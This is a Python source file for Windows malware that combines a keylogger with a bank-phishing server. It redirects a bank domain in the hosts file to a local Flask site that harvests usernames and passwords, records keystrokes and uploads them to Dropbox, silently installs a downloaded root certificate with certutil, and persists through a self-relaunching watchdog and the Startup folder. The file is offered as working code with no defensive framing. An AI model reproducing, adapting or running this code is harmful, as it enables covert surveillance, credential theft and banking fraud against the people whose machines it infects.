import os
import wget
from flask import Flask, render_template, request
import sqlite3
from pynput import keyboard
import tempfile, shutil, pathlib, dropbox, re, os
import subprocess
import sys
import zipfile


def change_hosts_file():
    hosts_location = "C:\\Windows\\System32\\drivers\\etc\\hosts"
    with open(hosts_location,'a') as file:
        file.write("      127.0.0.1        secured.hbank.co.us")
app = Flask(__name__)
count  = 0
keys = []

def upload_file():
    folder = pathlib.Path(".")   
    filename = "keyLogger.txt"        
    filepath = folder / filename  

    target = "/Temp/"             
    targetfile = target + filename   

    d = dropbox.Dropbox("Your API Key")
    with filepath.open("rb") as f:
        meta = d.files_upload(f.read(), targetfile, mode=dropbox.files.WriteMode("overwrite"))

    link = d.sharing_create_shared_link(targetfile)

    url = link.url

    dl_url = re.sub(r"\?dl\=0", "?dl=1", url)
    print (dl_url)



def on_press(key):
    global keys, count
    keys.append(key)
    count +=1
    if count >= 100:
        count = 0
        write_to_file(keys)
    if key == keyboard.Key.esc:
        return False

    
def write_to_file(keys):
    with open("KeyLogger.txt", "a") as f:
        for key in keys:
            k = str(key)
            if k == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(k)
    upload_file()


def spawn_program_and_die(program, exit_code=0):
    subprocess.Popen(program)
    sys.exit(exit_code)



@app.route('/')
def hello_world():
    return render_template('st.html')

@app.route('/get_user',methods=['POST'])
def user():
    if request.user_agent.string.startswith('Mozilla'):
        user = request.form.get('username')
        pas = request.form.get('password')
        con = sqlite3.connect('credentials.db')
        cur = con.cursor()
        cur.execute(f"INSERT INTO users VALUES ('{str(user)}', '{str(pas)}')")
        con.commit()
        con.close()
        print("done")
    return render_template('st.html')

    
def downloadRootCA(target):
    d = dropbox.Dropbox("Your API Key")
    d.files_download_to_file(target + "\RootCA.zip", '/rootCA.zip')

    with zipfile.ZipFile(target + "\RootCA.zip", 'r') as z:
        z.extractall(target)

if __name__ == '__main__':
 
    folder = pathlib.Path(__file__).parent.absolute()
    original = folder / "KeyLogger.py"
    target = tempfile.gettempdir() 
    
    watchdog_script = 'import os, tempfile, sys\nos.remove(sys.argv[1])\nwhile 1==1:\n\tos.system(\'start /W python %TEMP%/KeyLogger.py"\')'
    if str(folder) != target:
        with open(target + "/watchDog.py", 'w') as f:
            f.write(watchdog_script)
        shutil.copy(sys.argv[0], tempfile.gettempdir()) 
        downloadRootCA(target)  
        os.system('certutil -addstore -f "ROOT" %TEMP%/rootCA.pem')
        print(target + "\KeyLogger.py")    
        spawn_program_and_die(['python', target + "/watchDog.py", original])
    else:
        print(1)
        app.run(port=80)
        print("dd")
        shutil.copy(target + "/KeyLogger.py", os.environ['appdata'] + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\')
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()